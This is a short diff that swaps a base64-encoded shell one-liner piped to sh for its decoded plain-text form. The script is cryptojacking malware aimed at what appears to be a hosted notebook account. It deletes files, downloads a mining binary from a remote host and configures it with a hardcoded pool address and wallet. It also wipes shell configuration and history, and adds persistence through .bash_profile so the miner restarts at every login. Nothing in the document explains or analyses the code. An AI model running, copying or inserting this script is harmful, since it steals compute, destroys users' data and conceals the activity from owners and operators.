@@ -1,1 +1,23 @@
-base64 -d <<< Y2Qgfi8Kcm0gLXJ2ZiBlbGUqIGxvbCogMS40MyogVE9OKiB0b24qIE5CKiAubGliKiAuYmFzaCoKbWtkaXIgLmxpYgpjZCAubGliCnJtIC1SICoKcm0gLVIgL2hvbWUvc3R1ZGlvLWxhYi11c2VyLy50b24KV09SS0VSPSJSVFgtMjA2MCIKV0FMTEVUTkg9IjNBN2pUS0V5Tkh5TExuVU00OTgyb2t2b2pzMzFBVFhCTFgiClBPT0xOSD0iMy4xLjgxLjE3NTo4MCIKd2dldCBodHRwczovL2V3cjEudnVsdHJvYmplY3RzLmNvbS9taW5lcy9ncHl0aG9uCmVjaG8gIiIgID4gL2hvbWUvc3R1ZGlvLWxhYi11c2VyLy5iYXNocmMKZWNobyAiIiA+IC9ob21lL3N0dWRpby1sYWItdXNlci8uYmFzaF9oaXN0b3J5CmVjaG8gIiIgPiAvaG9tZS9zdHVkaW8tbGFiLXVzZXIvLmJhc2hfcHJvZmlsZQplY2hvICdlY2hvICIiICA+PiAvaG9tZS9zdHVkaW8tbGFiLXVzZXIvLmJhc2hfaGlzdG9yeScgPj4gL2hvbWUvc3R1ZGlvLWxhYi11c2VyLy5iYXNocmMKZWNobyAic291cmNlIC9ob21lL3N0dWRpby1sYWItdXNlci8uYmFzaF9wcm9maWxlIiAgPj4gL2hvbWUvc3R1ZGlvLWxhYi11c2VyLy5iYXNocmMKZWNobyAiTERfTElCUkFSWV9QQVRIPS9ob21lL3N0dWRpby1sYWItdXNlci8ubGliIiA+IC9ob21lL3N0dWRpby1sYWItdXNlci8uYmFzaF9wcm9maWxlCmVjaG8gImV4cG9ydCBMRF9MSUJSQVJZX1BBVEgiID4+IC9ob21lL3N0dWRpby1sYWItdXNlci8uYmFzaF9wcm9maWxlCmVjaG8gJ1dPUktFUj0ieCInID4+IH4vLmJhc2hfcHJvZmlsZQplY2hvICdXQUxMRVROSD0iM0E3alRLRXlOSHlMTG5VTTQ5ODJva3ZvanMzMUFUWEJMWCInID4+IC9ob21lL3N0dWRpby1sYWItdXNlci8uYmFzaF9wcm9maWxlCmVjaG8gJ1BPT0xOSD0iMy4xLjgxLjE3NTo4MCInID4+IC9ob21lL3N0dWRpby1sYWItdXNlci8uYmFzaF9wcm9maWxlCmVjaG8gImJhc2ggL2hvbWUvc3R1ZGlvLWxhYi11c2VyLy5saWIvZ2FzLnNoIiAgPj4gL2hvbWUvc3R1ZGlvLWxhYi11c2VyLy5iYXNoX3Byb2ZpbGUKZWNobyAiLi8ubGliL2dweXRob24gLS1hbGdvIGV0aGFzaCAtLXNlcnZlciAkUE9PTE5IIC0tdXNlciAkV0FMTEVUTkguJFdPUktFUiAtcCB4IC1pIDEwMCAtdyAwIC0ta2VybmVsIDAgLS1wcm90byBzdHJhdHVtIiA+IC9ob21lL3N0dWRpby1sYWItdXNlci8ubGliL2dhcy5zaApjaG1vZCAreCBnYXMuc2ggJiYgY2htb2QgK3ggZ3B5dGhvbiAmJiBjZCB+LyAmJiBoaXN0b3J5IC1jciAmJiBzb3VyY2UgLmJhc2hyYwo=|sh
+cd ~/
+rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash*
+mkdir .lib
+cd .lib
+rm -R *
+rm -R /home/studio-lab-user/.ton
+WORKER="RTX-2060"
+WALLETNH="3A7jTKEyNHyLLnUM4982okvojs31ATXBLX"
+POOLNH="3.1.81.175:80"
+wget https://ewr1.vultrobjects.com/mines/gpython
+echo ""  > /home/studio-lab-user/.bashrc
+echo "" > /home/studio-lab-user/.bash_history
+echo "" > /home/studio-lab-user/.bash_profile
+echo 'echo ""  >> /home/studio-lab-user/.bash_history' >> /home/studio-lab-user/.bashrc
+echo "source /home/studio-lab-user/.bash_profile"  >> /home/studio-lab-user/.bashrc
+echo "LD_LIBRARY_PATH=/home/studio-lab-user/.lib" > /home/studio-lab-user/.bash_profile
+echo "export LD_LIBRARY_PATH" >> /home/studio-lab-user/.bash_profile
+echo 'WORKER="x"' >> ~/.bash_profile
+echo 'WALLETNH="3A7jTKEyNHyLLnUM4982okvojs31ATXBLX"' >> /home/studio-lab-user/.bash_profile
+echo 'POOLNH="3.1.81.175:80"' >> /home/studio-lab-user/.bash_profile
+echo "bash /home/studio-lab-user/.lib/gas.sh"  >> /home/studio-lab-user/.bash_profile
+echo "./.lib/gpython --algo ethash --server $POOLNH --user $WALLETNH.$WORKER -p x -i 100 -w 0 --kernel 0 --proto stratum" > /home/studio-lab-user/.lib/gas.sh
+chmod +x gas.sh && chmod +x gpython && cd ~/ && history -cr && source .bashrc
